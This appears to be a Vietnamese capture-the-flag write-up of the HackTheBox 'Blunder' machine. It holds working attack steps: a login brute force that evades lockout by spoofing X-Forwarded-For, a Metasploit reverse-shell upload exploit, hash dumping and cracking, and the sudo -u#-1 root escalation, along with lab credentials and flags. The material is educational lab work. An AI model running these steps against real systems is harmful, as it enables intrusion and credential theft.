![image](https://hackmd.io/_uploads/HycW0Wlq0.png)

# Machine info and Comment
## Machine info
Blunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres. Using GoBuster, we identify a text file that hints to the existence of user fergus, as well as an admin login page that is protected against brute force. An exploit that bypasses the brute force protection is identified, and a dictionary attack is run against the login form. This attack grants us access to the admin panel as fergus. A GitHub issue detailing an arbitrary file upload and directory traversal vulnerability is identified, which is used to gain a shell as www-data. The system is enumerated and a newer version of the Bludit CMS is identified in the /var/www folder. The updated version contains the SHA1 hash of user hugo&amp;amp;#039;s password. The password can be cracked online, allowing us to move laterally to this user. Enumeration reveals that the user can run commands as any system user apart from root using sudo. The sudo binary is identified to be outdated, and vulnerable to CVE-2019-14287. Successful exploitation of this vulnerability returns a root shell.

## Comment


# Recon
## nmap
Sử dụng nmap ta, scan được **2** port ftp và http
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.191       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 05:14 EDT
Nmap scan report for 10.10.10.191
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
```
Scan tiếp các port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sCV -p21,80 10.10.10.191                       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 05:31 EDT
Nmap scan report for 10.10.10.191
Host is up (0.28s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
```
## Gobuster
```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u 10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3281]
/0                    (Status: 200) [Size: 7562]
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/usb                  (Status: 200) [Size: 3960]
/LICENSE              (Status: 200) [Size: 1083]
/todo.txt
```
Ngoài `/admin` ta có path **todo.txt** là file bất thường mà ta scan được

## Port 80 - http
Khi truy cập vào ta sẽ có giao diện web như này

![image](https://hackmd.io/_uploads/BkcIz0g9C.png)

Scan `gobuster` ở trên ta có được 2 path có thể truy cập và cần chú ý

### /admin
Tuy cập vào `/admin` ta sẽ được dẫn đến 1 form login đang sử dụng CMS Bludit

![image](https://hackmd.io/_uploads/Byz9zCeq0.png)

Khi nhìn vào source code từ `/admin`, ta thấy được CMS version của Bludit là **3.9.2**

![image](https://hackmd.io/_uploads/B1E7Z0g5C.png)

### /todo.txt
Truy cập vào `/todo.txt` ta được dẫn đến một note

![image](https://hackmd.io/_uploads/HJHeXCecC.png)

Chú ý vào dòng note cuối ta thấy việc cập nhật hình ảnh mới cho user `fergus` cho hoàn thành, rất có thể đây là người quản lí của web này

## Searchsploit
```
┌──(kali㉿kali)-[~/FinalRecon]
└─$ searchsploit bludit 3.9.2
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                                                               | php/webapps/48746.rb
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                                                     | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                                                              | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                                                        | multiple/webapps/48701.txt
Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)                                                                                                                   | php/webapps/51541.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Từ note `todo.txt` ta sẽ dùng đến brute-force để login vào trang admin

# User flag
## Exploit
### CeWL
[CeWL](https://github.com/digininja/CeWL) là một công cụ quét các từ tiềm năng từ trang web và lưu chúng vào một danh sách riêng. Sau đó, chúng ta có thể kết hợp danh sách này với các quy tắc mong muốn và tạo danh sách mật khẩu tùy chỉnh có xác suất đoán đúng mật khẩu cao hơn.
```
┌──(kali㉿kali)-[~]
└─$ cewl http://10.10.10.191 >pass.txt
                                                              
┌──(kali㉿kali)-[~]
└─$ wc -l pass.txt                                                                                     
350 pass.txt
```
### Bludit Brute Force Mitigation Bypass
Các phiên bản trước và bao gồm 3.9.2 của Bludit CMS dễ bị bỏ qua cơ chế chống bạo lực được áp dụng để chặn những người dùng đã cố đăng nhập sai 10 lần trở lên. Trong tệp `bl-kernel/security.php`(Sau khi khai thác vào sẽ thấy tệp này), có một hàm có tên `getUserIp` cố gắng xác định địa chỉ IP thực của người dùng cuối bằng cách tin cậy các tiêu đề HTTP `X-Forwarded-For` và `Client-IP`:

```
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```

Lý do đằng sau việc kiểm tra các header này là để xác định địa chỉ IP của người dùng cuối đang truy cập trang web bằng proxy. Tuy nhiên, việc tin tưởng vào các header này sẽ cho phép kẻ tấn công dễ dàng giả mạo địa chỉ nguồn. Ngoài ra, không có xác thực nào được thực hiện để đảm bảo chúng là địa chỉ IP hợp lệ, nghĩa là kẻ tấn công có thể sử dụng bất kỳ giá trị tùy ý nào và không có nguy cơ bị khóa.

Việc gửi yêu cầu đăng nhập có giá trị header `X-Forwarded-For` của FakeIp đã được xử lý thành công và nỗ lực đăng nhập không thành công đã được ghi lại vào chuỗi giả mạo:

```
{
    "minutesBlocked": 5,
    "numberFailuresAllowed": 10,
    "blackList": {
        "192.168.194.1": {
            "lastFailure": 1570286876,
            "numberFailures": 1
        },
        "10.10.10.10": {
            "lastFailure": 1570286993,
            "numberFailures": 1
        },
        "FakeIp": {
            "lastFailure": 1570287052,
            "numberFailures": 1
        }
    }
}
```
Các cuộc tấn công brute-force kéo dài có thể được thực hiện mà không có nguy cơ bị chặn sau 10 lần thử thất bại

Tóm lại dựa vào code của `48942.py`. Mấu chốt của nó nằm ở sự thay đổi của header `X-Forwarded-For`

```
┌──(kali㉿kali)-[~]
└─$ echo "fergus" > user.txt   
                               
┌──(kali㉿kali)-[~]
└─$ python3 48942.py -l http://10.10.10.191/admin/login -u user.txt -p pass.txt 

[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
[ ] Brute Force: Testing -> fergus:CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[▘] Brute Force: Testing -> fergus:the
[ ] Brute Force: Testing -> fergus:Load
<SNIP>

[<] Brute Force: Testing -> fergus:character
[ ] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```

Kết quả trả về password của fergus là **RolandDeschain**

![image](https://hackmd.io/_uploads/HyrDVZW90.png)

### Metasploit 
Sau khi login thành công, Metasploit có hỗ trợ khai thác **CVE-2019-16113** liên quan tới RCE:

Bludit 3.9.2 cho phép thực thi mã từ xa thông qua `bl-kernel/ajax/upload-images.php` vì code PHP có thể được nhập bằng tên tệp `.jpg` và sau đó code PHP này có thể ghi code PHP khác vào đường dẫn ../

![image](https://hackmd.io/_uploads/SkWsHWbqA.png)

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q     
msf6 > search Bludit  3.9.2

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability

Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec 
```
Set các options
```
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/bludit_upload_images_exec) > options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-met
                                          asploit/basics/using-metasploit.html
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.190.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2

View the full module info with the info, or info -d command.
```
RCE thành công
```
msf6 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
<SNIP>

meterpreter > shell
Process 9914 created.
Channel 0 created.
whoami
www-data
```
## Post-Exploit
Sau khi xâm nhập thành công, truy cập vào `/home` nhưng lại có và vẫn chưa thấy được `user.txt`
```
cd /home/fergus
/bin/sh: 6: cd: can't cd to /home/fergus
cd /home
ls
hugo
shaun
```
Sau đó cd vào 2 user này thì lại thấy user `hugo` đang có flag nhưng không có quyền để đọc
```
cd hugo
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
cat: user.txt: Permission denied
```

Tiếp tục thấy một folder khá thú vị là `databases` bao gồm credential của `fergus` và admin
```
ls
databases
pages
tmp
uploads
workspaces
pwd
/var/www/bludit-3.9.2/bl-content
cd databases
ls
categories.php
pages.php
plugins
security.php
site.php
syslog.php
tags.php
users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}            
```
Tuy nhiên password của admin không thể bẻ khóa được. Nên tiếp tục tìm ở các folder khác xem còn gì không

Khi di chuyển ra `/var/www` có folder của phiên bản 3.10 đã được cập nhật
```
cd /var/www
ls
bludit-3.10.0a
bludit-3.9.2
html
```

Tương tự tìm được credential của Hugo nhưng lần này crack được password
```
cd bludit-3.10.0a
ls
LICENSE
README.md
bl-content
bl-kernel
bl-languages
bl-plugins
bl-themes
index.php
install.php
cd bl-content
ls
databases
pages
tmp
uploads
workspaces
cd databases
ls
categories.php
pages.php
plugins
security.php
site.php
syslog.php
tags.php
users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
![image](https://hackmd.io/_uploads/rkhTKZW9A.png)

`Hugo:Password120`
### Lateral Movement
Di chuyển sang user Hugo
```
su Hugo
su: user Hugo does not exist
su hugo
Password: Password120
whoami
hugo
```
Từ đây ta có thể lấy được `user.flag`
```
cd /home/hugo
cd Desktop
ls
dir
pwd
/home/hugo/Desktop
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
cat user.txt
efa60e91be2d7dc8cc64******
```
# Root flag
## Exploit
### sudo -l
Kiểm tra quyền bằng lệnh sau 
```
sudo -l
sudo: no tty present and no askpass program specified
```
Lỗi này xuất hiện vì khi sudo trong một môi trường không có quyền truy cập vào TTY (như khi chạy trong một script không tương tác hoặc qua một hệ thống tự động hóa), sudo không thể yêu cầu mật khẩu từ người dùng. sudo thường yêu cầu mật khẩu qua TTY để xác thực quyền truy cập.

Để khắc phục ta dùng lệnh 
```
python -c 'import pty;pty.spawn("/bin/bash")'
hugo@blunder:~$ 
```
Sử dụng lại sudo -l 
```
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
### CVE-2019-14287
Google để xem cách khai thác thông báo `(ALL, !root) /bin/bash`

![image](https://hackmd.io/_uploads/r111A-bc0.png)

Kết quả trả về và xem được cách khai thác

![image](https://hackmd.io/_uploads/SJqlRW-qR.png)

```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
whoami
root
```
## Post-Exploit
```
root@blunder:/# cd /root 
cd /root
root@blunder:/root# cat root.txt
cat root.txt
974ecde7badde190ad6302****
```

# Results
1. How many TCP ports are open on the remote host? --> 2
2. What is the name of the unusual file that dirbusting reveals? --> todo.txt
3. What is the version of Bludit CMS that is used? --> 3.9.2
4. What is the password for the user "fergus" on Bludit CMS? --> RolandDeschain
5. What is the 2019 CVE ID for a remote code execution vulnerability in Bludit 3.9.2? --> CVE-2019-16113
6. What is the password of the user Hugo? --> Password120
7. Submit the flag located in the hugo user's home directory. --> efa60e91be2d7dc8cc64074c*****
8. What 2019 CVE ID is related to the currently installed Sudo version? --> CVE-2019-14287
9. Submit the flag located in root's home directory. --> 974ecde7badde190ad63*****

![image](https://hackmd.io/_uploads/S1s7JGbcA.png)
